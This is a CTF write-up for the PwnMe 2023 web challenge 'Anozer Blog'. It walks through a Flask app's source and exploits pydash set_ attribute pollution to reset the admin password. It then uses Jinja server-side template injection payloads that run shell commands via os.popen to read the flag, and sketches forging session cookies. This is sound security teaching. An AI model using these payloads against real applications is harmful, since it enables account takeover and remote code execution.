---
title: "[Medium][PwnMe 2023][Web] Anozer Blog"
date: "2023-05-07"
categories: [ "CTF", "PwnMe 2023 CTF", "Web" ]
tags: [ "Pollution", "Python", "PyDash", "SSTI" ]
ShowToc: false
draft: false
weight: 4
---

## Introduction

This challenge is a WEB challenge from the PWNME CTF.

### Context Explanation

A company needs a website to generate a QR Code. They asked a freelancer to do the job.

Since the website went live, they noticed strange behavior on their server.

They need you to audit their code and help them fix their problem.

### Directive

The flag is located in **/app/flag.txt**

## Solution

The web application to test is a blog that allows you to create articles and display them.

You can create and display articles, even if you are not logged in.

There is a section to create an account and log in.

I started by analyzing the sources that are available for download ([source link](https://github.com/mxcezl/PwnMe-CTF-2023/tree/main/Web/Medium/Anozer%20Blog/Anozer%20Blog%20Sources)).

The application is a Python web site with the Flask framework, which uses only two dependencies:

- Flask: latest
- PyDash: 5.1.2

### Analyzing app.py code

I started by analyzing the `app.py` file which is the main file of the application.

```python
from flask import Flask, render_template, render_template_string, request, redirect, session, sessions
from users import Users
from articles import Articles


users = Users()
articles  = Articles()
app = Flask(__name__, template_folder='templates')
app.secret_key = '(: secret :)'


@app.context_processor
def inject_user():
    return dict(session=session)

@app.route("/create", methods=["POST"])
def create_article():
    name, content = request.form.get('name'), request.form.get('content')
    if type(name) != str or type(content) != str or len(name) == 0:
        return redirect('/articles')
    articles.set(name, content)
    return redirect('/articles')

@app.route("/remove/<name>")
def remove_article(name):
    articles.remove(name)
    return redirect('/articles')

@app.route("/articles/<name>")
def render_page(name):
    article_content = articles[name]
    if article_content == None:
        pass
    if 'user' in session and users[session['user']['username']]['seeTemplate'] != False:
        article_content = render_template_string(article_content)
    return render_template('article.html', article={'name':name, 'content':article_content})

@app.route("/articles")
def get_all_articles():
    return render_template('articles.html', articles=articles.get_all())

@app.route('/show_template')
def show_template():
    if 'user' in session and users[session['user']['username']]['restricted'] == False:
        if request.args.get('value') == '1':
            users[session['user']['username']]['seeTemplate'] = True
            session['user']['seeTemplate'] = True
        else:
            users[session['user']['username']]['seeTemplate'] = False
            session['user']['seeTemplate'] = False
    return redirect('/articles')


@app.route("/register", methods=["POST", "GET"])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    username, password = request.form.get('username'), request.form.get('password')
    if type(username) != str or type(password) != str:
        return render_template("register.html", error="Wtf are you trying bro ?!")
    result = users.create(username, password)
    if result == 1:
        session['user'] = {'username':username, 'seeTemplate': users[username]['seeTemplate']}
        return redirect("/")
    elif result == 0:
        return render_template("register.html", error="User already registered")
    else:
        return render_template("register.html", error="Error while registering user")


@app.route("/login", methods=["POST", "GET"])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    username, password = request.form.get('username'), request.form.get('password')
    if type(username) != str or type(password) != str:
        return render_template('login.html', error="Wtf are you trying bro ?!")
    if users.login(username, password) == True:
        session['user'] = {'username':username, 'seeTemplate': users[username]['seeTemplate']}
        return redirect("/")
    else:
        return render_template("login.html", error="Error while login user")


@app.route('/logout')
def logout():
    session.pop('user')
    return redirect('/')

@app.route('/')
def index():
    return render_template("home.html")


app.run('0.0.0.0', 5000, debug=True)
```

Here we notice several things:

- The Flask server is in debug mode, which activates the `/console` endpoint that allows you to execute Python code on the server.
- There is a session variable `seeTemplate` which allows you to display or not the content of the articles as a template, potentially allowing template injection: `article_content = render_template_string(article_content)`.
- The secret key is declared in the code and not in the environment variables, so we can potentially retrieve or overwrite its value to sign cookies.

### Analyzing users.py code

I then looked at the `users.py` file that manages the users.

```python
import hashlib

class Users:

    users = {}

    def __init__(self):
        self.users['admin'] = {'password': None, 'restricted': False, 'seeTemplate':True }

    def create(self, username, password):
        if username in self.users:
            return 0
        self.users[username]= {'password': hashlib.sha256(password.encode()).hexdigest(), 'restricted': True, 'seeTemplate': False}
        return 1
    
    def login(self, username, password):
        if username in self.users and self.users[username]['password'] == hashlib.sha256(password.encode()).hexdigest():
            return True
        return False
    
    def seeTemplate(self, username, value):
        if username in self.users and self.users[username].restricted == False:
            self.users[username].seeTemplate = value

    def __getitem__(self, username):
        if username in self.users:
            return self.users[username]
        return None
```

We see in this file that there is an **admin** user with the password `None` and seeTemplate `True`:

```python
self.users['admin'] = {'password': None, 'restricted': False, 'seeTemplate':True }
```

By default, when you create a user via the register function, the user is restricted and cannot view templates:

```python
self.users[username]= {'password': hashlib.sha256(password.encode()).hexdigest(), 'restricted': True, 'seeTemplate': False}
```

We also see that the encryption method used for passwords is sha256.

### Analyzing articles.py code

The last Python file to analyze is `articles.py` which manages the articles.

```python
import pydash

class Articles:

    def __init__(self):
        self.set('welcome', 'Test of new template system: {%block test%}Block test{%endblock%}')

    def set(self, article_name, article_content):
        pydash.set_(self, article_name, article_content)
        return True


    def get(self, article_name):
        if hasattr(self, article_name):
            return (self.__dict__[article_name])
        return None
    
    def remove(self, article_name):
        if hasattr(self, article_name):
            delattr(self, article_name)

    def get_all(self):
        return self.__dict__

    def __getitem__(self, article_name):
        return self.get(article_name)
```

Here, only one thing is interesting: the `set` function that allows you to create an article. We see that the `set_` function from the `pydash` library is used to create a class attribute with the article name and the article content.

### Exploitation

Unfortunately for us, the `/console` endpoint is not accessible because it is protected by a code. There are ways to bypass this protection by having access to certain files on the machine, but this is not possible in this challenge.

There are several ways to exploit this application, but all involve creating an article with a specific name.

To understand the exploitation, we need to look at the `set_` function. Here is the official documentation of the `pydash` library:

```
pydash.objects.set_(obj, path, value)

Assigns the value of an object described by the path. If part of the object's path does not exist, it will be created.
```

```python
import pydash

pydash.set_({}, 'a.b.c', 1)
# Output: {'a': {'b': {'c': 1}}}

pydash.set_({}, 'a.0.c', 1)
# Output: {'a': {'0': {'c': 1}}}

pydash.set_([1, 2], '[2][0]', 1)
# Output: [1, 2, [1]]

pydash.set_({}, 'a.b[0].c', 1)
# Output: {'a': {'b': [{'c': 1}]}}
```

> Source: https://pydash.readthedocs.io/en/v5.1.2/api.html#pydash.objects.set_

In our case, the `set_` function is called with `self` as the first parameter, which corresponds to the `Articles` class. The second parameter is the name of the article, and the third parameter is the content of the article.

Since we control the title and content of the article, we can abuse the path to overwrite existing values or create new values.

For example, with an article named `__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.users.admin.password`, we can overwrite the value of the hashed administrator password and thus access their account.

#### Admin account access

By creating an article with this name and content `8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918` ("admin" in SHA256), we have just reset the administrator's password.

```python
import hashlib

print(hashlib.sha256("admin".encode()).hexdigest())
#8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
```

Now we can log in with `admin:admin` and have access to the `seeTemplate` feature.

![Admin login](/images/pwnme2023/web/anozer_blog_admin.png)

#### Access to the flag

Now that we have access to the admin account and the ability to view templates, we need to find a way to access the flag.

To do this, we remember that when creating an article, the content is passed through the Flask `render_template_string` function, which renders a template from a string.

By exploiting this function, we can inject a template and list files.

```python
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}
```

![Anozer Blog ls](/images/pwnme2023/web/anozer_blog_ls.png)

We can execute arbitrary commands on the server. All that's left is to read the flag.

```python
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("cat /flag.txt").read() }}
```

![Anozer Blog flag](/images/pwnme2023/web/anozer_blog_flag.png)


Flag : `PWNME{de3_pOL1tTiOn_cAn_B3_D3s7rUctv3}`

### Alternative solution

It is also possible to use the `set_` function from pydash to overwrite the value of the secret key.

In a Flask application using sessions, the secret key is used to sign session cookies. If we manage to overwrite the value of the secret key, we can sign our own session cookies and thus log in with the admin account.

We can then use a tool like `flask-unsign` to read the content of a regular user's session cookie, modify the payload to replace the username with `admin`, and sign the cookie with our new secret key.

## Tips & Tricks

- Read the documentation of the libraries used.
- Identify the entry points of the application.
- Identify places where user data is used.
- The `set_` function from the `pydash` library allows creating class attributes from a string and can be used to overwrite existing values or create new ones.
- Test SSTI (Server-Side Template Injection) with payloads like `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}` on places where user data is used and interpreted.